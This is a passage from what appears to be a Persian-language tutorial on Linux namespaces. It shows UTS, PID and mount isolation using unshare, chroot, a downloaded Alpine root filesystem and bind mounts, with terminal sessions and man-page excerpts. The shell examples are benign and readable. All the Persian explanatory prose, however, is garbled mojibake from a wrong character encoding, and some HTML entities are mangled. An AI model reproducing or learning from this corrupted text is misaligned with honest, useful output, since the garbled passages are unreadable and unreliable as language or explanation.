397 1 root /sbin/init splash 4026531839 ipc 397 1 root /sbin/init splash 4026531840 mnt 385 1 root /sbin/init splash 4026532009 net 353 1 root /sbin/init splash ... ุจู ุตูุฑุช ูพุดโูุฑุถ ุฏุฑ ูุงุดู ูุฒุจุงู ุงุฒ ูุฑ ููุน ูุถุงูุงู ฺฉ ููุฑุฏ ูุฌูุฏ ุฏุงุฑุฏ ฺฉู ุชูุณุท ูพุฑุฏุงุฒูโูุง ููุฑุฏ ุงุณุชูุงุฏู ูุฑุงุฑ ูโฺฏุฑุฏ. ูพุฑุฏุงุฒูโูุง ูโุชูุงููุฏ ูุถุงูุงูโูุง ุจุดุชุฑ ุงุฒ ููโุนโูุง ูุฎุชูู ุงุฌุงุฏ ฺฉููุฏ ู ุจู ุขู ูุชุตู ุดููุฏ. ุงูุจุชู ูุฑ ูพุฑุฏุงุฒู ููุท ูโุชูุงูุฏ ุฏุฑ ฺฉ ูุถุงูุงู ุงุฒ ฺฉ ููุน ุจุงุดุฏ. ููฺูู ุฏุฑ ุตูุฑุช ฺฉู ูุถุงูุงู ุฎุงู ุจุงุดุฏ (ูุซูุง ูฺโ ูพุฑุฏุงุฒูโุง ุจู ุขู ูุชุตู ูุดุฏู ุจุงุดุฏ ุง ูฺ bind mount ุฏุฑ ุขู ูุฌูุฏ ูุฏุงุดุชู ุจุงุดุฏ ู \u0026hellip;) ฺฉุฑูู ุจู ุตูุฑุช ุฎูุฏฺฉุงุฑ ุขู ุฑุง ุญุฐู ูโฺฉูุฏ. ุฏุฑ ุงุฏุงูู ุจู ุจุฑุฑุณ ูุถุงูุงูโูุง ูโูพุฑุฏุงุฒู.\nUnshare ฺุณุชุ ุฏุฑ ูุถุง ุณุณุชูโุนุงูู ููุช ุดูุง ุฏุฑุฎูุงุณุช ุงุฌุฑุง ฺฉ ุจุฑูุงูู ุฑุง ุตุงุฏุฑ ูโฺฉูุฏุ ุณุณุชูโุนุงูู ุจุง ุงุฌุฑุง ฺฉ ุณุฑ ุฑูุงูโูุง ู ุณูพุณ ฺฉูพโฺฉุฑุฏู ฺฉุฏ ุจุฑูุงูู ุฏุฑ ุญุงูุธูโ ุงุตู (ุฑู) ฺฉ ูพุฑุฏุงุฒูโ ุฌุฏุฏ ุงุฌุงุฏ ูโฺฉูุฏ ู ุจู ุงุตุทูุงุญ ุขู ุจุฑูุงูู ุฑุง ุงุฌุฑุง ูโฺฉูุฏ. ุฏุฑ ุงู ูุถุง ุฏู ููููู ูพุฏุฑ (parent) ู ูุฑุฒูุฏ (child) ูุฌูุฏ ุฏุงุฑุฏ ฺฉู ุจู ุตูุฑุช ูพุดโูุฑุถ ุจุง ูู ุฏุงุฏูโูุง ูุดุชุฑฺฉ ุฏุงุฑูุฏ (ุจุฑุง ุงุทูุงุนุงุช ุจุดุชุฑ ุจู fork ู clone ูุฑุงุฌุนู ฺฉูุฏ). ุจุฑุง ุงุฒูููโ ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ู ุญุฐู ุงู ููุงุท ูุดุชุฑฺฉ ูโุชูุงู ุงุฒ ฺฉ systemcall ุจู ูุงู unshare ุงุณุชูุงุฏู ฺฉุฑุฏ. ุฏุฑ โูุงูุน ุจุง ุงุณุชูุงุฏู ุงุฒ unshare ูโุชูุงู ฺฉ ุจุฑูุงูู ุฑุง ุจุง ูุถุงูุงูโูุง ูุฎุชุต ุจู ุฎูุฏุด ฺฉู ุจุง ูพุฏุฑุด ุง ุฏฺฏุฑ ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ูุดุชุฑฺฉ ูุจุงุดุฏุ ุงุฌุฑุง ูููุฏ.\nุงฺฏุฑ ุนูุงููโููุฏ ูุณุชุฏ ุฌุฒุฆุงุช ุจุดุชุฑ ุจุฏุงูุฏ ุฑุงุฌุน ุจู set_ns ุclone ุnsenter ู pivot_root ูุทุงูุนู ฺฉูุฏ.\nูุถุงูุงู UTS ูุฑ ูุงุดู ุฏุงุฑุง ฺฉ ุดูุงุณูโ ุงุณุช ฺฉู ุจู ุขู hostname ฺฏูุชู ูโุดูุฏ. ุฏุฑุณุช ูุงููุฏ URL ูุฑ ูุจโุณุงุช ุงุฒ ุงู ุดูุงุณู ูโุชูุงู ุจุฑุง ุงุดุงุฑู ุจู ุขู ูุงุดู ุฏุฑ ุฏุงุฎู ุขู ูุงุดู ุง ุดุจฺฉู ุงุณุชูุงุฏู ฺฉุฑุฏ. ุงฺฏุฑ ฺฉ ุชุฑููุงู ุจุฑ ุฑู ุณุณุชูโุนุงูู ูููฺฉุณ ุจุงุฒ ฺฉูุฏ ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ hostname ูโุชูุงูุฏ ููุฏุงุฑ hostname ูุนู ุฑุง ุจุจูุฏ:\n1 2 $ hostname Milad-PC ุจุง ูุฑุงุฑ ุฏุงุฏู ฺฉ ูพุฑุฏุงุฒู ุฏุฑ ฺฉ ูุถุงูุงู UTS ุงุฎุชุตุงุตุ ูพุฑุฏุงุฒู ุตุงุญุจ hostname ู domainname ุงุฎุชุตุงุต ุฎูุงูุฏ ุดุฏ ู ูโุชูุงู ููุงุฏุฑ ุฏูุฎูุงู ุจุฑุง hostname ู domainname ุจุฑุง ุขู ูพุฑุฏุงุฒู ุชูุธู ฺฉุฑุฏ ฺฉู ุงู ุชุบุฑ ุชุงุซุฑ ุฏุฑ ููุงุฏุฑ ูุฑุจูุทู ุฏุฑ ูุงุดู ูุฒุจุงู ูุฎูุงูุฏ ุฏุงุดุช.\nุชฺฉููููฺโูุง ฺฉุงูุชูุฑโฺฉุฑุฏู (ูุงููุฏ ุฏุงฺฉุฑ) ุจู ูุฑ ฺฉุงูุชูุฑ ฺฉ ุดูุงุณูโ ุชุตุงุฏู ุงุฎุชุตุงุต ูโุฏููุฏ ฺฉู ุจู ุตูุฑุช ูพุดโูุฑุถ ููู ุดูุงุณู ุจู ุนููุงู hostname ุฏุฑ ุขู ฺฉุงูุชูุฑ ุงุณุชูุงุฏู ูโุดูุฏ. ุจุฑุง ุจุฑุฑุณ ุงู ููุถูุน ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ูโุชูุงู ฺฉ ฺฉุงูุชูุฑ ุงุฌุงุฏ ฺฉุฑุฏ ู ููุฏุงุฑ hostname ุฏุงุฎู ฺฉุงูุชูุฑ ุฑุง ูุดุงูุฏู ูููุฏ.\n1 2 3 $ docker run --rm -it --name hostname-test hub.hamdocker.ir/library/alpine sh / # hostname a6b9c92876b7 ุจุง ุงุณุชูุงุฏู ุงุฒ unshare ูโุชูุงูู ฺฉ ูุถุงูุงู ุฌุฏุฏ UTS ุงุฌุงุฏ ฺฉูู ู ุงู ููุฑุฏ ุฑุง ุขุฒูุงุด ฺฉูู. ุจุฑุง ุงูฺฉุงุฑ ุจุงุฏ unshare ุฑุง ุจุง ุฏุณุชุฑุณ ฺฉุงุฑุจุฑ root ุงุฌุฑุง ฺฉูู. ุฏุฑ ุฒูุงู ูุฑุงุฎูุงู unshare ููุน ูุถุงูุงู ู ูุงูโ ุจุฑูุงููโุง ฺฉู ูโุฎูุงูู ุงุฌุฑุง ฺฉูู ุฑุง ุจุงุฏ ูุงุฑุฏ ฺฉูู. ุฏุฑ ุตูุฑุช ฺฉู ูุงู ุจุฑูุงูู ูุงุฑุฏ ูุดูุฏ ุจู ุตูุฑุช ูพุดโูุฑุถ ุงุฒ ููุฏุงุฑ {SHELL}$ ุงุณุชูุงุฏู ุฎูุงูุฏ ุดุฏ.\n1 2 3 4 5 6 7 8 9 10 $ sudo unshare --uts /bin/bash root@Milad-PC:~# hostname Milad-PC root@Milad-PC:~# hostname xyz-hostname root@Milad-PC:~# hostname xyz-hostname root@Milad-PC:~# exit exit $ hostname Milad-PC ุงู ฺฉุงุฑ ุจุงุนุซ ุดุฏู ฺฉู bash ุฏุงุฎู ฺฉ ูพุฑุฏุงุฒูโ ุฌุฏุฏ ฺฉู ูุถุงูุงู UTS ูุฎุชุต ุจู ุฎูุฏุด ุฑุง ุฏุงุฑุฏ ุงุฌุฑุง ุดูุฏ. ูุฑ ุจุฑูุงููโุง ฺฉู ุฏุฑ ุงู ุดู ุงุฌุฑุง ุดูุฏ ูุฒ ุงู ูุถุงูุงู ุฑุง ุจู ุงุฑุซ ุฎูุงูุฏ ุจุฑุฏ. ุจุฑุง ูุซุงู ููุงูโุทูุฑ ฺฉู ุฏุฑ ุจุงูุง ูโุจูุฏ ุจุง ุงุฌุฑุง hostname ุงุจุชุฏุง ููุงู ููุฏุงุฑ ุชูุธู ุดุฏู ุฏุฑ ูุงุดู ูุฒุจุงู ููุงุด ุฏุงุฏู ูโุดูุฏุ ุณูพุณ ุจุง ุชูุธู ฺฉ ููุฏุงุฑ ุฌุฏุฏุ hostname ุฏุฑ ุงู ูุถุงูุงู ุชุบุฑ ูโฺฉูุฏ ูู ุฏุฑ ูุฒุจุงู ุชุบุฑ ุงุนูุงู ูุดุฏู ุงุณุช. ุงู ุงุฒููู ฺฉุฑุฏู ุจุงุนุซ ูโุดูุฏ ฺฉู ูุฒุจุงู ู ูููุงู ุจุฏูู ุชุฃุซุฑ ุจุฑ ุฑู ููุฏฺฏุฑ ููุงุฏุฑ hostname ุฑุง ุจู ููุฏุงุฑ ุฏูุฎูุงู ุชุบุฑ ุฏููุฏ.\nูุถุงูุงู ุดูุงุณูู ูพุฑุฏุงุฒูโูุง (PID) ุงฺฏุฑ ุดูุง ุฏุณุชูุฑ ps ุฑุง ุฏุงุฎู ฺฉ ฺฉุงูุชูุฑ ุงุฌุฑุง ฺฉูุฏ ููุท ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ููุงู ฺฉุงูุชูุฑ ุฑุง ูโุจูุฏ ู ุจู ููุฑุณุช ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ูุงุดู ูุฒุจุงู ุฏุณุชุฑุณ ูุฎูุงูุฏ ุฏุงุดุช.\n1 2 3 4 5 $ docker run --rm -it --name pid-test hub.hamdocker.ir/library/alpine sh / # ps -eaf PID USER TIME COMMAND 1 root 0:00 sh 7 root 0:00 ps -eaf ุฏุฑ โูุงูุน ุจุง ุจูุฑูโุจุฑุฏุงุฑ ุงุฒ ูุถุงูุงู PID ูุงุจูุช ูุญุฏูุฏ ฺฉุฑุฏู ุงูฺฉุงู ุฏุณุชุฑุณ ุจู ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ูุฒุจุงู ุจุฑุง ฺฉุงูุชูุฑูุง ุจุง ุงุฒููู ฺฉุฑุฏู ููุฑุณุช ุดูุงุณูโ ูพุฑุฏุงุฒูโูุง ูุฑุงูู ูโุดูุฏ. ุจุฑุง ุขุฒูุงุด ูุถุงูุงู PID ูุฌุฏุฏุงู ุงุฒ unshare ุงุณุชูุงุฏู ูโฺฉูู:\n1 2 3 4 5 6 7 8 9 $ sudo unshare --pid sh # id uid=0(root) gid=0(root) groups=0(root) # id sh: 2: Cannot fork # ls sh: 3: Cannot fork # id sh: 4: Cannot fork ุงฺฏู ุจู ุฎุฑูุฌ ุฏุณุชูุฑุงุช ุจุงูุง ุฏูุช ฺฉูุฏ ุจู ูุธุฑ ูุดฺฉู ูุฌูุฏ ุฏุงุฑุฏ. ุจู ุบุฑ ุงุฒ ุฏุณุชูุฑ ุงููุ ุจูู ุฏุณุชูุฑโูุง ุจุง ุฎุทุง ููุงุฌู ุดุฏูโุงูุฏ. ุงฺฏู ุจู ูุชู ุฎุทุง ุฏูุช ฺฉูุฏ ูุงูุจ ุขู ุงุฒ ฺูพ ุจู ุฑุงุณุช ุจู ุตูุฑุช ูุงู ุฏุณุชูุฑุ ุดูุงุณูโ ูพุฑุฏุงุฒู ู ูุชู ุฎุทุง ูโุจุงุดุฏ. ุจุง ุงุฌุฑุงโ ูุฑ ุฏุณุชูุฑุ ุดูุงุณูโโ ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงูุฒุงุด ุงุณุช ู ุงู ูุดุงู ุฏููุฏูโ ุงุนูุงู โุดุฏู ูุถุงูุงู PID ุงุณุชุ ุงูุง ุงฺฏุฑ ูุชูุงู ุจุด ุงุฒ ฺฉ ูพุฑุฏุงุฒู ุฏุฑ ุงู ูุถุงูุงู ุงุฌุฑุง ฺฉุฑุฏุ ฺฉุงููุงู ุจูุงุงุณุชูุงุฏู ุจุงู ูโูุงูุฏ. ูุชู ุฎุทุง ุฏุฑุงูุช ู ููฺูู ุชูุถุญุงุช unshare ูุดุงู ูโุฏููุฏ ฺฉู:\n1 2 3 $ man unshare -f, --fork Fork the specified program as a child process of unshare rather than running it directly. This is useful when creating a new PID namespace. ูพุณ ุจุง ุงุณุชูุงุฏู ุงุฒ fork\u0026ndash; ูพุฑุฏุงุฒูโ ุฌุฏุฏ ูุณุชููุงู ุจู ุตูุฑุช ฺฉ ูุฑุฒูุฏ ุงุฒ unshare ุงุฌุฑุง ุฎูุงูุฏ ุดุฏ. ุญุงู ูุฌุฏุฏุงู ฺฉ ูุถุงูุงู PID ุงุฌุงุฏ ูโฺฉูู. ุจุง ุงุฌุฑุง ฺูุฏ ุฏุณุชูุฑ ูุดุงูุฏู ูโฺฉูู ุฎุทุง ูุจู ุฑูุน ุดุฏู ุงุณุช:\n1 2 3 4 5 $ sudo unshare --pid --fork /bin/bash root@Milad-PC:/tmp# id uid=0(root) gid=0(root) groups=0(root) root@Milad-PC:/tmp# cat /etc/hostname Milad-PC ุณูพุณ ุจุฑุง ููุฑุณุช ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ูุถุงูุงู ุฌุฏุฏ ุงุฒ ุฏุณุชูุฑ ps ุงุณุชูุงุฏู ูโฺฉูู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@Milad-PC:/tmp# ps -eaf UID PID PPID C STIME TTY TIME CMD root 1 0 0 ููุฑู18 ? 00:00:09 /sbin/init splash root 2 0 0 ููุฑู18 ? 00:00:00 [kthreadd] root 4 2 0 ููุฑู18 ? 00:00:00 [kworker/0:0H] ... root 6210 9375 0 02:02 pts/2 00:00:00 sudo unshare --pid --fork /bin/bash root 6211 6210 0 02:02 pts/2 00:00:00 unshare --pid --fork /bin/bash root 6212 6211 0 02:02 pts/2 00:00:00 /bin/bash root 6421 6212 0 02:03 pts/2 00:00:00 ps -eaf โฆ milad 7089 1 0 ููุฑู18 ? 00:00:06 /lib/systemd/systemd --user milad 7090 7089 0 ููุฑู18 ? 00:00:00 (sd-pam) milad 8536 8426 1 ููุฑู18 tty2 01:24:19 /usr/lib/chromium-browser/chromium-browser --type=renderer --field-trial-handle=1178073432432703370 milad 10327 7677 0 ููุฑู18 pts/1 00:00:11 /usr/bin/zsh ุงฺฏุฑ ุฏุฑ ฺฉ ฺฉุงูุชูุฑ ุงุฌุงุฏ ุดุฏู ูุซูุงู ุจุง ุฏุงฺฉุฑ ุฏุณุชูุฑ ps ุฑุง ูุงุฑุฏ ฺฉูุฏ ููุท ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ููุงู ฺฉุงูุชูุฑ ุฑุง ูุดุงูุฏู ุฎูุงูุฏ ฺฉุฑุฏ. ุจุง ุชูุฌู ุจู ุฎุฑูุฌ ุฏุณุชูุฑ ps ุดุงุฏ ุงูโุทูุฑ ุจู ูุธุฑ ุจุฑุณุฏ ฺฉู ูุถุงูุงู PID ุฌุฏุฏ ุจู ุฏุฑุณุช ูพุฑุฏุงุฒูโ ุฌุฏุฏ ุฑุง ุงุฒููู ูฺฉุฑุฏู ู ูพุฑุฏุงุฒูโ ุฌุฏุฏ ุจู ููุฑุณุช ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ูุฒุจุงู ุฏุณุชุฑุณ ุฏุงุฑุฏ ุงูุง ุฏุฑโ ูุงูุน ุงูโุทูุฑ ูุณุช. ููุฑุณุช ูพุฑุฏุงุฒูโูุง ูุฒุจุงู ุจู ุงู ุนูุช ุฏุฑ ุฏุณุชุฑุณ ุงุณุช ฺฉู ุฏุณุชูุฑ ps ุงุทูุงุนุงุช ุฑุง ุงุฒ ุฑู ูุงูโูุง ููุฌูุฏ ุฏุฑ ูุณุฑ proc/ ูโุฎูุงูุฏ ู ูพุฑุฏุงุฒุด ูโฺฉูุฏ. ุงฺฏู ุงุฒ ูุณุฑ proc/ ุฏุฑ ูุฒุจุงู ls ุจฺฏุฑุฏ ููุฑุณุช ุงุฒ ุฏุงุฑฺฉุชูุฑโูุง ุฑุง ูุดุงูุฏู ุฎูุงูุฏ ฺฉุฑุฏ ฺฉู ูุชูุงุธุฑ ุจุง ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ุณุณุชูโุนุงูู ูโุจุงุดุฏ ฺฉู ุฏุฑ ุฏุงุฎู ุขูโูุง ุงุทูุงุนุงุช ฺฉุงูู ูพุฑุฏุงุฒูโูุง ุจู ุตูุฑุช ููุฑุณุช ุงุฒ ูุงูโูุง ูุฌูุฏ ุฏุงุฑุฏ.\n1 2 3 $ ls /proc 1 132 1483 1943 2052 239 2566 272 321 4510 513 540 6635 7433 7575 817 9136 fs pagetypeinfo โฆ ุจุฑุง ุงูฺฉู ุฏุฑ ูุถุงูุงู ุฌุฏุฏ ุฏุณุชูุฑ ps ููุท ุงุทูุงุนุงุช ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ููู ูุถุงูุงู ุฑุง ุจุฑฺฏุฑุฏุงููุฏ ุจุงุฏ ฺฉ ูุณุฑ proc/ ูุฌุฒุง ุจุฑุง ููู ูุถุงูุงู ูุฌูุฏ ุฏุงุดุชู ุจุงุดุฏ ฺฉู ฺฉุฑูู ุงุทูุงุนุงุช ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ุขู ุฑุง ูุฏุฑุช ฺฉูุฏ ฺฉู ุจุฑุง ูพุงุฏูโุณุงุฒ ุขู ูโุชูุงู ุงุฒ chroot ุงุณุชูุงุฏู ฺฉุฑุฏ.\nุฏุฑ ุฒูุงู ุงุฌุงุฏ ฺฉ ฺฉุงูุชูุฑ ุจู ุทูุฑ ูพุดโูุฑุถ ุจู ุฌุง ุฏุณุชุฑุณ ฺฉุงูู ุจู ูุงูโุณุณุชู ูุฒุจุงูุ ูพุฑุฏุงุฒูโูุง ุจู ุจุฎุด ฺฉูฺฺฉ ุงุฒ ูุงู ุณุณุชู ุฏุณุชุฑุณ ุฎูุงููุฏ ุฏุงุดุชุ ฺูู ุฏุฑุณุช ุจุนุฏ ุงุฒ ุงุฌุงุฏ ฺฉุงูุชูุฑ ุฏุงุฑฺฉุชูุฑ root ุจุฑุง ูพุฑุฏุงุฒูโ ุงุตู ุฏุงุฎู ฺฉุงูุชูุฑ ุชุบุฑ ูโฺฉูุฏ. ุฏุฑ ุณุณุชูโุนุงูู ูููฺฉุณ ุงู ุนููุงุช ุจุง ุงุณุชูุงุฏู ุงุฒ chroot ุงูุฌุงู ูโุดูุฏ.\nุฏุฑ ุชูุถุญุงุช chroot ุงุดุงุฑู ุดุฏู ุงุณุช ฺฉู chroot ฺฉ ุฏุณุชูุฑ ุง shell ุฑุง ุฏุฑ ุฏุงุฑฺฉุชูุฑ ุฌุฏุฏ ุงุฌุฑุง ูโฺฉูุฏ ู ููฺูู ุงฺฏุฑ ุฏุณุชูุฑ ูุงุฑุฏ ูุดูุฏ ุจู ุตูุฑุช ูพุดโูุฑุถ ุงุฒ ููุฏุงุฑ ูุชุบุฑ SHELL$ ุงุณุชูุงุฏู ุฎูุงูุฏ ฺฉุฑุฏ.\n1 2 3 4 5 $ man chroot NAME chroot - run command or interactive shell with special root directory โฆ If no command is given, run \u0026#39;\u0026amp;quot$SHELL\u0026amp;quot -i\u0026#39; (default: \u0026#39;/bin/sh -i\u0026#39;). ุจุฑุง ุฏุฑฺฉ ุจูุชุฑ ุงู ูุฑุขูุฏ ุฏุณุชูุฑุงุช ุฒุฑ ุฑุง ุงุฌุฑุง ูโฺฉูู:\n1 2 3 4 5 6 7 $ mkdir /tmp/new_root_dir $ sudo chroot /tmp/new_root_dir chroot: failed to run command โ/usr/bin/zshโ: No such file or directory $ sudo chroot /tmp/new_root_dir id chroot: failed to run command โidโ: No such file or directory $ sudo chroot /tmp/new_root_dir ls chroot: failed to run command โlsโ: No such file or directory ุจุง ุชูุฌู ุจู ูุชูโ ุฎุทุง ุจู ูุธุฑ ูโุฑุณุฏ ฺฉู ุจุนุฏ ุงุฒ ุชุบุฑ ุฏุงุฑฺฉุชูุฑ root ุฏุณุชุฑุณ ุจู ุจุฑูุงููโูุง ููุฌูุฏ ุฏุฑ ุฏุงุฑฺฉุชูุฑ bin/ ุงูฺฉุงูโูพุฐุฑ ูุณุช. ุจูุงุจุฑุงู ุญุช ุงูฺฉุงู ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑุงุช ูุซู ls ู id ูุฑุงูู ูุณุช. ุจูุงุจุฑุงู ุชูุงู ูุงูโโูุง ููุฑุฏ ูุงุฒุ ุจุงุฏ ุจู ุฏุงุฑฺฉุชูุฑ ุฌุฏุฏ ุงูุชูุงู ุฏุงุฏู ุดูุฏุ ฺฉุงููุงู ูุดุงุจู ุฒูุงู ฺฉู ฺฉ ฺฉุงูุชูุฑ ูุงูุน ุงุฌุงุฏ ูโุดูุฏ. ฺฉ ฺฉุงูุชูุฑ ุงุฒ ุฑู ฺฉ image ุงุฌุงุฏ ูโุดูุฏ ฺฉู ุขู image ุญุงู ุชูุงู ูุงูโูุง ุงุณุช ฺฉู ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ุขู ฺฉุงูุชูุฑ ุจู ุขู ูุงุฒ ุฏุงุฑูุฏ. ุฏุฑโ ูุงูุน ุขู image ุฏููุงู ุญุงู ูุงูโุณุณุชู ุงุณุช ฺฉู ูพุฑุฏุงุฒูโูุง ุขู ุฑุง ูโุจููุฏ.\nุจูุงุจุฑุงู ุงฺฏุฑ ูุง ูุงูโุณุณุชู ฺฉ ุณุณุชูโุนุงูู ฺฉูฺฺฉ ูุซู Alpine Linux ุฑุง ุฏุงุดุชู ุจุงุดูโ ูโุชูุงูู ุจู ุขู chroot ฺฉูู ู ุขู ุฑุง ุฏุฑ ูุถุงูุงู ุฌุฏุฏ ุงุฌุฑุง ฺฉูู. ุจุฑุง ุงูุฌุงู ุงู ฺฉุงุฑ ุฏุณุชูุฑุงุช ุฒุฑ ุฑุง ุงุฌุฑุง ูโฺฉูู ฺฉู ุงุจุชุฏุง ฺฉ ุฏุงุฑฺฉุชูุฑ ุฌุฏุฏ ุงุฌุงุฏ ูโุดูุฏุ ุณูพุณ ุขุฎุฑู ูุณุฎูโ ูุนู ูุงูโุณุณุชู ุฑุง ุฏุงูููุฏ ู ุงุณุชุฎุฑุงุฌ ูโฺฉูู.\n1 2 3 4 5 6 7 8 9 10 $ mkdir alpine $ cd alpine $ curl -o alpine.tar.gz http://dl-cdn.alpinelinux.org/alpine/v3.13/releases/x86_64/alpine-minirootfs-3.13.0-x86_64.tar.gz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2664k 100 2664k 0 0 15768 0 0:02:53 0:02:53 --:--:-- 18207 $ tar -xzf alpine.tar.gz $ ls alpine.tar.gz bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var $ rm -rf alpine.tar.gz ุณูพุณ ุจุง chroot ุฏุฑ ุงู ุฏุงุฑฺฉุชูุฑ ูโุชูุงูู ุฏุณุชูุฑุงุช ุฑุง ุฏุฑ ูุณุฑ ุฌุฏุฏ ุงุฌุฑุง ฺฉูู.\n1 2 3 $ cd .. $ sudo chroot alpine ls bin dev dst etc home lib media mnt opt proc root run sbin src srv sys tmp usr var ... ุจุง ุงุชูุงู ุงุฌุฑุง ูพุฑุฏุงุฒู (ุง ุฏุณุชูุฑ) ูุฑุฒูุฏุ ูุฌุฏุฏุงู ฺฉูุชุฑู ุจู ูพุฑุฏุงุฒูโ ูพุฏุฑ ุจุฑูโฺฏุฑุฏุฏ. ุจุฑุง ุงูฺฉู ุจุชูุงูู ุฏุณุชูุฑุงุช ุจุดุชุฑ ุฏุฑ ุฏุงุฑฺฉุชูุฑ ุฌุฏุฏ ุงุฌุฑุง ฺฉูู ูโุชูุงูู ฺฉ ุดู ุฑุง ุจู ุนููุงู ูพุฑุฏุงุฒูโ ูุฑุฒูุฏ ุงุฌุฑุง ฺฉูู.\n1 2 3 4 5 6 $ sudo chroot alpine sh / # id uid=0(root) gid=0(root) groups=0(root) / # ls bin dev dst etc home lib media mnt opt proc root run sbin src srv sys tmp usr var / # exit ุญุงูุง ุจุง ุจูุฑูโุจุฑุฏุงุฑ ุงุฒ ูุงุจูุช chroot ู ูุถุงูุงูโูุง ูโุชูุงูู ฺฉ ูุถุงูุงู PID ุงุฌุงุฏ ฺฉุฑุฏู ู ุฏุฑ ุฒูุงู ูุฑุงุฎูุงู unshare ุฏุณุชูุฑ chroot ุฑุง ุงุฌุฑุง ฺฉูู ู ุณูพุณ ุฏุฑ ุฏุงุฎู ูุถุงูุงู ุฏุงุฑฺฉุชูุฑ proc/ ูุงูโุณุณุชู (image) ุฑุง mount ฺฉูู. ุจุง ุงูุฌุงู ุงู ฺฏุงูโูุง ฺฉ ูุฏู ุฏุฑ ุงุฒููู ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ุฏุงุฎู ฺฉุงูุชูุฑ ุจุฑุฏุงุดุชู ูโุดูุฏ ู ุฌุฒุฆุงุช ูพุฑุฏุงุฒูโูุง ูุฒุจุงู ุงุฒ ุฏุฏ ูพุฑุฏุงุฒูโูุง ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ูุถุงูุงู ูุฎู ุฎูุงูุฏ ุจูุฏ. ุจุฑุง ุขุฒูุงุด ุงู ููุถูุน ุฏุณุชูุฑุงุช ุฒุฑ ุฑุง ุงุฌุฑุง ูโฺฉูู:\n1 2 3 4 5 6 $ sudo unshare --pid --fork chroot alpine sh / # mount -t proc proc proc / # ps -eaf PID USER TIME COMMAND 1 root 0:00 sh 3 root 0:00 ps -eaf ูุถุงูุงู Mount ุจุฑุง ุงูฺฉู ูพุฑุฏุงุฒูโูุง ุฏุงุฎู ฺฉ ฺฉุงูุชูุฑ ุจู ูุงู ุณุณุชู ูุฒุจุงู ุฏุณุชุฑุณ ูุฏุงุดุชู ุจุงุดุฏุ ุจุงุฏ ุจู ุขูโูุง ูุฑุฒ ุงุฌุงุฏ ุดูุฏ. ุจุง ุงุณุชูุงุฏู ุงุฒ ูุถุงูุงู mount ูโุชูุงู ุงู ูุงุจูุช ุฑุง ุจุฑุง ูพุฑุฏุงุฒูโูุง ูุฑุงูู ฺฉุฑุฏ.\nุจุฑุง ูุซุงู ุฏุฑ ุฒุฑ ูุง ุฏุฑ ฺฉ ูุถุงูุงู mount ุฌุฏุฏ ฺฉ bind mount ุงุฌุงุฏ ูโฺฉูู. Bind mounts ุงู ูุงุจูุช ุฑุง ูุฑุงูู ูโฺฉูุฏ ฺฉู ุจุฎุด ุงุฒ ฺฉ ูุงู ุณุณุชู ฺฉู ูุจูุงู mount ุดุฏู ุฑุง ุฏุฑ ฺฉ ุฏุงุฑฺฉุชูุฑ ุฏฺฏู ูุฌุฏุฏุงู mount ฺฉูุฏ. ุจุง ุจูุฑูโุจุฑุฏุงุฑ ุงุฒ ุงู ูุงุจูุช ูโุดูุฏ ุนููุงุช ูุฎุชูู ูุซู ุงุดุชุฑุงฺฉ ฺฏุฐุงุฑ ููุท ุฎูุงูุฏูุ chroot jail ุง ฺฉุงูุชูุฑ ฺฉุฑุฏู ุฑุง ูพุงุฏูโุณุงุฒ ฺฉุฑุฏ.\n1 2 3 4 5 6 7 8 9 10 11 12 $ sudo unshare --mount /bin/bash root@Milad-PC:~# mkdir src root@Milad-PC:~# echo \u0026amp;quotsample\u0026amp;quot \u0026gt; src/test.txt root@Milad-PC:~# ls src test.txt root@Milad-PC:~# mkdir dst root@Milad-PC:~# ls dst root@Milad-PC:~# mount --bind src dst root@Milad-PC:~# ls dst test.txt root@Milad-PC:~# cat dst/test.txt sample ููุงูโุทูุฑ ฺฉู ูโุจูู ุจุนุฏ ุงุฒ ุงุนูุงู bind ูุญุชูุง ุฏุงุฑฺฉุชูุฑ src ุฏุฑ dst ูุฒ ุฏุฑ ุฏุณุชุฑุณ ุงุณุช. ุจุง ุงุณุชูุงุฏู ุงุฒ findmnt ูโุชูุงูู ุฌุฒุฆุงุช ุจุดุชุฑ ุฑุง ุจุจูู ฺฉู ุงู mount ุฏุฑ ุงู ูุถุงูุงู ุงุฌุงุฏ ุดุฏู ุงุณุช ู ุงุฒ ุฏุฏ ูุฒุจุงู ูุฎู ูโุจุงุดุฏ.\n1 2 3 root@Milad-PC:~# findmnt dst TARGET SOURCE FSTYPE OPTIONS /home/milad/dst /dev/sda5[/milad/src] ext4 rw,relatime,data=ordered ุจุฑุง ูุซุงู ุฏุฑ ฺฉ ุชุฑููุงู ุฏฺฏุฑ ุฏุฑ ูุฒุจุงู ู ุฎุงุฑุฌ ุงุฒ ุงู ูุถุงูุงู ููู ุฏุณุชูุฑ ุฑุง ุงุฌุฑุง ูโฺฉูู.\n1 $ findmnt dst ุญุงูุง ุงฺฏุฑ ููู ุฏุณุชูุฑ findmnt ุฑุง ุฏุฑ ูุถุงูุงู ุณุงุฎุชู ุดุฏู ูุฌุฏุฏุงู ุจุฏูู 